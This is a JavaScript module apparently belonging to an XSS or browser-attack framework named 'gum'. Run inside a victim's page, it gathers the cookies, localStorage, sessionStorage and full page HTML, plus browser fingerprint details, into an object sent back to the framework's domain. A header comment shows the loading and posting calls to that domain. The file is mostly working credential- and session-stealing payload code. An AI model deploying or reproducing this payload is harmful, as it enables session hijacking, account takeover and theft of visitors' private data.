/*
    quinner - 140502
    get_info - gum.js
        - base probe
            gum.script('http://' + gum.domain + '/static/brows/get_info.js', function(){
                //gum.post('http://' + gum.domain + '/ing', gum.backinfo);
                //gum.backinfo = {};
            });
        and
            get_info.py
*/
gum_getinfo = function(){
    var info_cookie = document.cookie;
    var info_localStorage = gum.e("JSON.stringify(window['localStorage'])");
    var info_sessionStorage = gum.e("JSON.stringify(window['sessionStorage'])");
    var info_page_html = document.documentElement.outerHTML;
    var info_browser = (!!self.ActiveXObject)&&('ie')
        ||(!!self.chrome)&&('chrome')
        ||(self.mozPaintCount>-1)&&('firefox')
        ||(!!self.opera)&&('opera')
        ||(!self.chrome&&!!self.WebKitPoint)&&('safari')
        ||('unknow');
    var info_user_agent = navigator.userAgent;
    var info_screen = 'screen='+screen.height+'*'+screen.width+' window='+screen.availHeight+'*'+ screen.availWidth;
    var info_istouch = (document.ontouchstart)?('yes'):('no');
    var info_isgps = (navigator.geolocation)?('yes'):('no');
    var info_os = navigator.platform;
    var info_date = Date();
    var info_referrer = document.referrer;
    var info_plugins = '|';
    for (i=0; i<navigator.plugins.length; i){
        info_plugins += navigator.plugins[i].name + '|';
        i++;
    };
    var info_websocket =  (!!window.WebSocket || !!window.MozWebSocket)?('yes'):('no');
    var info_isjava = (!!navigator.javaEnabled())?('yes'):('no');
    var info_url = document.URL;

    gum.backinfo['cookie'] = info_cookie;
    gum.backinfo['localStorage'] = info_localStorage;
    gum.backinfo['sessionStorage'] = info_sessionStorage;
    gum.backinfo['browser'] = info_browser;
    gum.backinfo['user_agent'] = info_user_agent;
    gum.backinfo['screen'] = info_screen;
    gum.backinfo['istouch'] = info_istouch;
    gum.backinfo['isgps'] = info_isgps;
    gum.backinfo['referrer'] = info_referrer;
    gum.backinfo['os']  = info_os;
    gum.backinfo['date'] = info_date;
    gum.backinfo['plugins'] = info_plugins;
    gum.backinfo['page_html'] = info_page_html;
    gum.backinfo['websocket'] = info_websocket;
    gum.backinfo['isjava'] = info_isjava;
    gum.backinfo['url'] = info_url;
}();
